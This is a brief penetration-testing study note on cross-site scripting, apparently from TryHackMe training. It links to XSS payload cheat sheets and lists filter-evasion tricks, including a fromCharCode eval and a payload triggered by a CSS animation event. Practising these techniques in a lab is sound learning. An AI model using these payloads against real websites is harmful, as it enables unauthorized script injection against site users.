# XSS 
#pentest/tryhackme

## Good resources
[PayloadsAllTheThings/XSS Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## Techniques from XSS Room
* replace `alert` by using `propmpt`
* `eval(String.fromCharCode(…))`
* `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>`
